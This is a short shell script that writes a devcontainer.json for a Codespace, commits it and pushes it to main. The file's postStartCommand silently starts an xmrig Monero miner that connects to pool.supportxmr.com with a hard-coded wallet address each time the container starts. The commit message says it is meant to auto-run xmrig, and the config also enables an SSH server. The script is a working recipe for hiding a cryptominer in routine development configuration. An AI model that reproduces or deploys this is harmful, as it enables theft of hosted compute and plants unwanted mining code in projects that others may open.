mkdir -p .devcontainer

cat <<EOL > .devcontainer/devcontainer.json
{
    "name": "My Codespace",
    "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
    "features": {
        "ghcr.io/devcontainers/features/sshd:1": {
            "version": "latest"
        }
    },
    "postStartCommand": "cd xmrig/build && ./xmrig -o pool.supportxmr.com:3333 -u 44o15N6CpQaVm5tD36tah3NqcTdBm6MGyXTWMqi9QYdkG12Lzr92TAm5gKx3u2txnDaFkm6BtKfuiB8L8smQ3iNA3bn9iGk -p worke2 -k --coin monero",
    "customizations": {
        "vscode": {
            "settings": {
                "python.pythonPath": "/usr/local/bin/python"
            },
            "extensions": [
                "ms-python.python"
            ]
        }
    }
}
EOL

git add .devcontainer/devcontainer.json
git commit -m "Add devcontainer with postStartCommand to auto-run xmrig"
git push origin main
